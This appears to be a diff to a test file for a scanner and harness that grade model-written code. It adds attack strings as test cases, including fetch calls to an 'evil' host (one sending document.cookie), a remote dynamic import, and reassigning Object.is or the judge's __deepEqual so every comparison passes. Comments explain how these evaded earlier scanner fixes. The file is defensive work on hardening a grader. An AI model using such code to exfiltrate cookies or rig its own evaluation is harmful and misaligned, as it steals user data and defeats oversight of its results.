@@ -53,6 +53,28 @@ const ATTACKS: Record<string, string> = {
   "an assignment hidden in an initialiser": 'var _y = (globalThis.x = 1);',
   "an arrow IIFE": 'const _z = (() => { fetch("https://evil/"); })();',
   "a function-expression IIFE": 'const _w = function(){ fetch("x"); }();',
+
+  // ---- the shapes a LINE-BASED scanner kept missing --------------------
+  // Every one of these was caught, then missed again by a fix for the
+  // previous one. The scanner now splits into top-level STATEMENTS, because a
+  // line is not a unit of execution and "what else is on this line" was a
+  // question three separate patches answered wrongly.
+  "a const prefix does not exempt the rest of the line":
+    "const _a = () => {}; Object.is = () => true;",
+  "...nor does a function-expression prefix":
+    "const _a = function(){}; Object.is = () => true;",
+  "...nor does it hide a fetch":
+    'const _a = () => {}; fetch("https://evil/");',
+  "...nor a dynamic import":
+    'const _a = () => {}; import("https://evil/m.js");',
+  "a regex after a keyword must not unbalance the depth counter":
+    'function isBrace(s) { return /[{]/.test(s); }\nfetch("https://evil/?c=" + document.cookie);',
+  "a division after a string must not be read as a regex and swallow the next line":
+    'const x = "5" / 2;\nfetch("https://evil/");',
+  "...or after a template literal":
+    'const x = `5` / 2;\nObject.is = () => true;',
+  "...or after an increment":
+    'let i = 0;\nconst y = i++ / 2;\nfetch("https://evil/");',
 };
 
 for (const [name, src] of Object.entries(ATTACKS)) {
@@ -75,9 +97,24 @@ const RE = /[{}()]/g;
 const slug = (s) => s.replace(RE, "").trim();
 const sq = function (x) { return x * x; };
 const load = async (u) => (await fetch(u)).json();
+const half = (n) => n / 2;
 function tick(w) { return { ...w, t: w.t + 1 }; }
 export function initialWorld() { return { t: 0, names: NAMES.map(slug) }; }
 class Thing { constructor() { this.n = 0; } }
+
+// MULTI-LINE function bodies. A fix that skipped the depth counter rejected
+// every one of these -- the body was scanned as if it were top level, so
+// "w.money -= a.cost;" was reported as a module-load side effect. The
+// false-positive tests only used SINGLE-LINE arrows, so it passed 264/264
+// while making the scanner unusable on ordinary model output.
+export const applyAction = (w, a) => {
+  w.money -= a.cost;
+  return w;
+};
+const step = function (w) {
+  w.t += 1;
+  return w;
+};
 `;
   assert.deepEqual(topLevelSideEffects(legitimate), []);
 });
@@ -103,4 +140,28 @@ test("the harness captures its comparators before the candidate runs", () => {
     /if \(__is\(a, b\)\) return true;/.test(built),
     "__deepEqual must actually use the captured reference",
   );
+});
+
+test("the judge itself cannot be reassigned by the candidate", () => {
+  // Capturing the INTRINSICS was not enough, and the comment claiming it made
+  // the attack "impossible" was wrong. __deepEqual and __partialMatch were
+  // function DECLARATIONS, which hoist into mutable module-scope bindings, so
+  //     const _a = () => {}; __deepEqual = () => true;
+  // owned the verdict exactly as overriding Object.is had. Confirmed in a real
+  // ES module: it returned true for __deepEqual(1, 2).
+  //
+  // Declared with const BELOW the splice point, the binding is in the temporal
+  // dead zone while the candidate runs, so the assignment throws instead of
+  // succeeding. That is a property of the language, not of a filter.
+  const built = buildSimHarnessModule("/*CANDIDATE*/", [{ name: "t", fn: "tick", args: [], expected: null } as never]);
+  for (const name of ["__deepEqual", "__partialMatch"]) {
+    assert.ok(
+      built.includes(`const ${name} = `),
+      `${name} must be a const, not a hoisted function declaration a candidate can reassign`,
+    );
+    assert.ok(
+      !new RegExp(`function\\s+${name}\\s*\\(`).test(built),
+      `${name} must not be declared with \`function\` -- that binding is mutable and the candidate runs first`,
+    );
+  }
 });
